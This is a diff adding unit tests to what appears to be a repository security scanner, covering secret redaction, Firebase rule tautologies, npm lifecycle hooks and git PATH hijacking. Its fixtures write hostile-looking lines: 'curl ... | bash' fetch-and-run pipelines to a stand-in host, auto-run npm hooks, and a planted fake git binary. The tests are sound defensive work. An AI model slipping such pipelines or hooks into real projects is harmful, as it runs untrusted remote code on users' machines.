@@ -6,6 +6,7 @@ import importlib.util
 import json
 import os
 from pathlib import Path
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -13,6 +14,7 @@ import time
 import types
 import unittest
 from unittest import mock
+from urllib.parse import unquote
 
 
 REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
@@ -192,6 +194,23 @@ class PreflightTests(unittest.TestCase):
         )
         self.assertEqual(before, tree_digest(fixture.root))
 
+    def test_req_010_text_report_is_ascii_safe_under_ascii_stdout(self) -> None:
+        fixture = RepositoryFixture(self)
+        firebase = synthetic_firebase_key()
+        fixture.write("caf\u00e9/config.js", f'const firebaseApiKey = "{firebase}";\n')
+
+        completed = self.run_scanner(
+            fixture.root,
+            "text",
+            environment_overrides={"PYTHONIOENCODING": "ascii"},
+        )
+
+        self.assertEqual(0, completed.returncode, completed.stderr)
+        self.assertIn("VW-FIREBASE-PUBLIC-API-KEY", completed.stdout)
+        self.assertIn(r"caf\xe9/config.js", completed.stdout)
+        self.assertNotIn(firebase, completed.stdout)
+        completed.stdout.encode("ascii", "strict")
+
     def test_req_007_matched_secret_is_redacted_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
         synthetic_value = synthetic_cloud_key()
@@ -208,6 +227,30 @@ class PreflightTests(unittest.TestCase):
                 self.assertIn("VW-SECRET-CLOUD-ACCESS-KEY", completed.stdout)
                 self.assertIn("config.txt", completed.stdout)
                 self.assertIn("rotate", completed.stdout.lower())
+
+    def test_req_007_literal_redaction_marker_cannot_bypass_path_redaction(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "[REDACTED]SyntheticPathCredential12345"
+        assignment_name = "pass" + "word"
+        fixture.write("config.txt", f'{assignment_name} = "{synthetic_value}"\n')
+        fixture.write(synthetic_value, synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn(synthetic_value, completed.stdout)
+                self.assertNotIn(synthetic_value, completed.stderr)
+                if output_format == "sarif":
+                    document = json.loads(completed.stdout)
+                    decoded_locations = [
+                        unquote(location["physicalLocation"]["artifactLocation"]["uri"])
+                        for result in document["runs"][0]["results"]
+                        for location in result.get("locations", [])
+                    ]
+                    self.assertTrue(
+                        all(synthetic_value not in location for location in decoded_locations)
+                    )
 
     def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
@@ -504,6 +547,29 @@ class PreflightTests(unittest.TestCase):
             {finding["path"] for finding in rule_findings},
         )
 
+    def test_req_008_literal_integer_tautologies_block_firestore_and_rtdb(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("firestore.rules", "allow read: if 0 == 0;\nallow write: if 0 == 1;\n")
+        fixture.write(
+            "database.rules.json",
+            '{"rules": {".read": "-7 == -7", ".write": "7 == 8"}}\n',
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(
+            {"database.rules.json", "firestore.rules"},
+            {finding["path"] for finding in findings},
+        )
+        self.assertEqual(2, len(findings))
+
     def test_req_008_firebase_tautology_scan_is_bounded_on_long_failure(self) -> None:
         scanner = load_scanner_module()
         candidate = scanner.Candidate(
@@ -756,6 +822,49 @@ class PreflightTests(unittest.TestCase):
         self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
         self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)
 
+    def test_req_009_all_npm_scripts_are_remote_scanned_and_lifecycle_hooks_are_named(self) -> None:
+        fixture = RepositoryFixture(self)
+        remote = ("cu" + "rl") + " https://invalid.example/tool | " + ("ba" + "sh")
+        scripts = {
+            "prepublish": remote,
+            "preprepare": remote,
+            "postprepare": remote,
+            "build": remote,
+            "safe": "printf safe",
+        }
+        fixture.write(
+            "package.json",
+            json.dumps({"name": "synthetic-project", "scripts": scripts}, indent=2) + "\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        remote_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        lifecycle_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-INSTALL-SCRIPT"
+        }
+        source_lines = (fixture.root / "package.json").read_text(encoding="utf-8").splitlines()
+        expected_remote = {
+            index
+            for index, line in enumerate(source_lines, start=1)
+            if any(f'"{name}"' in line for name in ("prepublish", "preprepare", "postprepare", "build"))
+        }
+        expected_lifecycle = {
+            index
+            for index, line in enumerate(source_lines, start=1)
+            if any(f'"{name}"' in line for name in ("prepublish", "preprepare", "postprepare"))
+        }
+        self.assertEqual(expected_remote, remote_lines)
+        self.assertEqual(expected_lifecycle, lifecycle_lines)
+
     def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
         fixture = RepositoryFixture(self)
         first_fetcher = "cu" + "rl"
@@ -897,6 +1006,36 @@ class PreflightTests(unittest.TestCase):
             "VW-SHELL-PIPELINE-UNPARSED",
             {finding["rule_id"] for finding in report["findings"]},
         )
+
+    def test_req_009_negation_and_time_wrappers_cannot_hide_remote_execution(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write(
+            "wrappers.sh",
+            f"! {fetcher} https://invalid.example/negated | {shell}\n"
+            f"time {fetcher} https://invalid.example/timed | {shell}\n"
+            f"time -p {fetcher} https://invalid.example/portable | {shell}\n"
+            f"time --format elapsed {fetcher} https://invalid.example/formatted | {shell}\n"
+            f"time --unknown {fetcher} https://invalid.example/ambiguous | {shell}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        remote = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        unparsed = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual({1, 2, 3, 4}, remote)
+        self.assertEqual({5}, unparsed)
 
     def test_req_009_remote_execution_contexts_comments_interpreters_and_heredocs(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1279,6 +1418,84 @@ class PreflightTests(unittest.TestCase):
                 self.assertEqual("filesystem", report["scope"]["mode"])
                 self.assertFalse(marker.exists())
 
+    @unittest.skipIf(os.name == "nt", "PATH symlink regression uses POSIX executable semantics")
+    def test_req_010_git_from_worktree_path_symlink_is_never_executed(self) -> None:
+        fixture = RepositoryFixture(self, git=False)
+        fixture.write("README.md", "ordinary\n")
+        controlled_directory = fixture.base / "controlled"
+        controlled_directory.mkdir()
+        marker = fixture.base / "git-executed-through-symlink"
+        fake_git = controlled_directory / "git"
+        fake_git.write_text(
+            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 1\n",
+            encoding="utf-8",
+        )
+        fake_git.chmod(0o700)
+        worktree_path = fixture.root / "bin"
+        worktree_path.symlink_to(controlled_directory, target_is_directory=True)
+
+        completed = self.run_scanner(
+            fixture.root,
+            environment_overrides={"PATH": str(worktree_path)},
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual("filesystem", report["scope"]["mode"])
+        self.assertFalse(marker.exists())
+
+    @unittest.skipUnless(os.name == "nt", "Windows PATH junction regression")
+    def test_req_010_git_from_worktree_path_junction_is_rejected(self) -> None:
+        scanner = load_scanner_module()
+        fixture = RepositoryFixture(self, git=False)
+        controlled_directory = fixture.base / "controlled"
+        controlled_directory.mkdir()
+        shutil.copy2(sys.executable, controlled_directory / "git.exe")
+        worktree_path = fixture.root / "bin"
+        created = subprocess.run(
+            ["cmd", "/c", "mklink", "/J", str(worktree_path), str(controlled_directory)],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
+        )
+        if created.returncode != 0:
+            self.skipTest(f"junction creation unavailable: {created.stderr.strip()}")
+
+        with mock.patch.dict(os.environ, {"PATH": str(worktree_path)}):
+            with self.assertRaises(scanner.GitUnavailable):
+                scanner._resolve_git_executable(fixture.root)
+
+    def test_req_011_sensitive_env_metadata_survives_content_skips(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(".env.oversized", "A" * 129)
+        fixture.write(".env.nul", b"TOKEN=SyntheticCredential123\0")
+        fixture.write(".env.invalid-utf8", b"TOKEN=\xff\xfe")
+        fixture.write(".env.binary.png", b"\x89PNG\r\n\x1a\n")
+        fixture.track(".env.oversized", ".env.nul", ".env.invalid-utf8", ".env.binary.png")
+
+        completed = self.run_scanner(
+            fixture.root,
+            "json",
+            "--max-file-bytes",
+            "128",
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        env_findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-ENV-TRACKED"
+        ]
+        self.assertEqual(
+            {".env.binary.png", ".env.invalid-utf8", ".env.nul", ".env.oversized"},
+            {finding["path"] for finding in env_findings},
+        )
+        self.assertEqual(1, report["summary"]["skipped_by_reason"]["oversized"])
+        self.assertEqual(3, report["summary"]["skipped_by_reason"]["binary"])
+
     def test_req_011_opened_descriptor_identity_change_fails_closed(self) -> None:
         scanner = load_scanner_module()
         fixture = RepositoryFixture(self, git=False)
@@ -1477,6 +1694,10 @@ class PreflightTests(unittest.TestCase):
             'reason="reviewed" owner="app-team" approved-by="app\u200b-team" compensating-control="rules" expires="2099-01-01"',
             'reason="reviewed" owner="app" approved-by="security" compensating-control="rules" expires="2000-01-01"',
             'reason="reviewed" owner="app" approved-by="security" expires="2099-01-01"',
+            'reason="reviewed" owner="\u200b" approved-by="security" compensating-control="rules" expires="2099-01-01"',
+            'reason="\u200b" owner="app" approved-by="security" compensating-control="rules" expires="2099-01-01"',
+            'reason="reviewed" owner="app" approved-by="\u200b" compensating-control="rules" expires="2099-01-01"',
+            'reason="reviewed" owner="app" approved-by="security" compensating-control="\u200b" expires="2099-01-01"',
         )
         for metadata in cases:
             with self.subTest(metadata=metadata):
